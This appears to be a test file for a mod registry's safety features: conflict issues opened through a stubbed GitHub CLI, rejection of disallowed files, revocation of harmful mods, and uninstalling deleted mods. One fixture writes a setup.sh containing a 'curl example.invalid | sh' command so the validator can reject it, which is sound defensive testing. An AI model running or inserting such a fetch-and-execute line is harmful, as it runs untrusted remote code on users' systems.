// The safety nets around published mods: the conflict issue a maintainer
// gets when a release breaks their mod (and its closing once fixed), the
// files a mod may contain, and revocation: a mod removed for doing harm is
// never built again, and a build that has it stops running it.
import { beforeAll, describe, expect, test } from "bun:test"
import { $ } from "bun"
import { chmodSync, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import path from "node:path"
import { addFile, addVersion, cli, createHarness, createMod, greeting, release, sandbox, setGreeting, WATCH } from "./harness"

const sb = sandbox("safety")
const VALIDATE = path.resolve(import.meta.dir, "../../script/validate.ts")
const launcher = () => path.join(sb.om, "bin", "greet")
const friendlyDir = () => path.join(sb.reg, "mods", "t", "friendly", "fake")

// A stand-in for the GitHub CLI: it records every call, and answers
// `issue list` with whatever the test put in issues.json.
const ghLog = path.join(sb.T, "gh.log")
const ghIssues = path.join(sb.T, "issues.json")
async function watch(...a: string[]) {
  const p = Bun.spawn(["bun", WATCH, ...a, "--registry", sb.reg], {
    cwd: sb.reg,
    env: { ...process.env, PATH: `${path.join(sb.T, "bin")}:${process.env.PATH}`, GITHUB_REPOSITORY: "t/registry", GH_LOG: ghLog, GH_ISSUES: ghIssues },
    stdout: "pipe",
    stderr: "pipe",
  })
  const [out, err] = await Promise.all([new Response(p.stdout).text(), new Response(p.stderr).text()])
  return { code: await p.exited, out, err }
}

beforeAll(async () => {
  await createHarness(sb)
  await createMod(sb, "friendly", setGreeting("hello from friendly"))
  mkdirSync(path.join(sb.T, "bin"), { recursive: true })
  writeFileSync(
    path.join(sb.T, "bin", "gh"),
    `#!/bin/sh\nprintf '%s\\n---\\n' "$*" >> "$GH_LOG"\ncase "$1 $2" in\n  "issue list") cat "$GH_ISSUES" 2>/dev/null || echo "[]" ;;\n  "issue create") echo "https://github.com/t/registry/issues/1" ;;\nesac\n`,
  )
  chmodSync(path.join(sb.T, "bin", "gh"), 0o755)
})

describe("the conflict issue", () => {
  test("gives commands that restore the mod from the registry and move it onto the release", async () => {
    await release(sb, "v2.0.0", addFile("CHANGELOG.md", "2.0.0\n"))
    const results = path.join(sb.T, "results")
    mkdirSync(results, { recursive: true })
    writeFileSync(path.join(results, "friendly.json"), JSON.stringify({ mod: "t/friendly", harness: "fake", ref: "v2.0.0", commit: "x", applies: false, error: "patch does not apply" }))
    rmSync(ghLog, { force: true })
    const r = await watch("apply", results, "--issues")
    expect(r.code, r.err).toBe(0)
    const created = readFileSync(ghLog, "utf8").split("\n---\n").find((c) => c.startsWith("issue create"))!
    expect(created).toContain("t/friendly does not support Fake 2.0.0")
    expect(created).toContain("git checkout -b friendly v1.0.0")
    expect(created).toContain("git am ../openmods/mods/t/friendly/fake/v1.0.0/*.patch")
    expect(created).toContain("git rebase --onto v2.0.0 v1.0.0 friendly")
    expect(created).toContain("openmods install . --owner t")
    expect(created).toContain('openmods pack . --name friendly --owner t --registry ../openmods --note "works on Fake 2.0.0"')
    expect(created).toContain("--label conflict")
  })
  test("closes itself once the mod has a version for that release, and not before", async () => {
    writeFileSync(ghIssues, JSON.stringify([{ number: 7, title: "t/friendly does not support Fake 2.0.0" }]))
    rmSync(ghLog, { force: true })
    await watch("plan", "--issues", "--ref", "v2.0.0")
    expect(readFileSync(ghLog, "utf8")).not.toContain("issue close")
    await addVersion(sb, friendlyDir(), "v2.0.0")
    rmSync(ghLog, { force: true })
    const r = await watch("plan", "--issues", "--ref", "v2.0.0")
    expect(r.err).toContain("closed #7: t/friendly now supports Fake 2.0.0.")
    expect(readFileSync(ghLog, "utf8")).toContain("issue close 7")
    expect(() => JSON.parse(r.out)).not.toThrow() // the plan's JSON stays clean
  })
})

describe("the files a mod may contain", () => {
  test("anything besides mod.json, README.md, support.json and its patches fails the registry check", async () => {
    const extra = path.join(friendlyDir(), "setup.sh")
    writeFileSync(extra, "curl example.invalid | sh\n")
    const r = await $`bun ${VALIDATE} --registry ${sb.reg}`.nothrow().quiet()
    rmSync(extra)
    expect(r.exitCode).toBe(1)
    expect(r.stderr.toString()).toContain("fake/setup.sh is not a file a mod may contain")
  })
})

describe("revocation", () => {
  const revoke = (entry: object) => writeFileSync(path.join(sb.reg, "revoked.json"), JSON.stringify({ revoked: [entry] }))
  test("a revoked mod cannot be installed", async () => {
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    const r = await cli(sb, "install", "t/friendly")
    expect(r.code).toBe(1)
    expect(r.err).toContain("t/friendly was removed from OpenMods: It sends your files to a server. It cannot be built.")
  })
  test("a build that already has it stops running it: every launch warns and starts the stock harness", async () => {
    rmSync(path.join(sb.reg, "revoked.json"))
    expect((await cli(sb, "install", "t/friendly")).code).toBe(0)
    expect(await greeting(sb)).toBe("hello from friendly")
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    const check = await cli(sb, "check-updates", "fake")
    expect(check.out).toContain("t/friendly was removed from OpenMods")
    for (let i = 0; i < 2; i++) {
      const run = await $`sh ${launcher()}`.nothrow().quiet()
      expect(run.stdout.toString().trim()).toBe("stock greet")
      expect(run.stderr.toString()).toContain("t/friendly was removed from OpenMods: It sends your files to a server.")
    }
    expect((await cli(sb, "status")).out).toContain("removed t/friendly was removed from OpenMods")
    const on = await cli(sb, "on")
    expect(on.code).toBe(1)
    expect(on.err).toContain("`openmods uninstall t/friendly` removes it")
  })
  test("only the updates listed are revoked", async () => {
    revoke({ id: "t/friendly", updates: [2], reason: "Update 2 sends your files to a server." })
    const check = await cli(sb, "check-updates", "fake")
    expect(check.out).not.toContain("removed from OpenMods")
  })
  test("an install from before update numbers were recorded is matched by its patches", async () => {
    const file = path.join(sb.om, "state.json")
    const state = JSON.parse(readFileSync(file, "utf8"))
    delete state.fake.updates
    writeFileSync(file, JSON.stringify(state))
    revoke({ id: "t/friendly", updates: [2], reason: "Update 2 sends your files to a server." })
    expect((await cli(sb, "check-updates", "fake")).out).not.toContain("removed from OpenMods")
    revoke({ id: "t/friendly", updates: [1], reason: "Update 1 sends your files to a server." })
    expect((await cli(sb, "check-updates", "fake")).out).toContain("t/friendly was removed from OpenMods")
  })
  test("it can be uninstalled even after it is deleted from the registry", async () => {
    revoke({ id: "t/friendly", reason: "It sends your files to a server." })
    rmSync(path.join(sb.reg, "mods", "t", "friendly"), { recursive: true })
    const r = await cli(sb, "uninstall", "t/friendly")
    expect(r.code, r.all).toBe(0)
    expect(existsSync(launcher())).toBe(false)
    expect((await cli(sb, "status")).out).toContain("No mods installed")
  })
})

describe("mods deleted from the registry", () => {
  test("a build is remade without them only when they are uninstalled together", async () => {
    rmSync(path.join(sb.reg, "revoked.json"), { force: true })
    await createMod(sb, "left", addFile("LEFT.md", "left\n"))
    await createMod(sb, "right", addFile("RIGHT.md", "right\n"))
    expect((await cli(sb, "install", "t/left", "t/right")).code).toBe(0)
    rmSync(path.join(sb.reg, "mods", "t", "left"), { recursive: true })
    rmSync(path.join(sb.reg, "mods", "t", "right"), { recursive: true })
    const one = await cli(sb, "uninstall", "t/left")
    expect(one.code).toBe(1)
    expect(one.err).toContain("t/right is no longer in the registry either")
    expect(one.err).toContain("openmods uninstall t/left t/right")
    const both = await cli(sb, "uninstall", "t/left", "t/right")
    expect(both.code, both.all).toBe(0)
    expect((await cli(sb, "status")).out).toContain("No mods installed")
  })
})
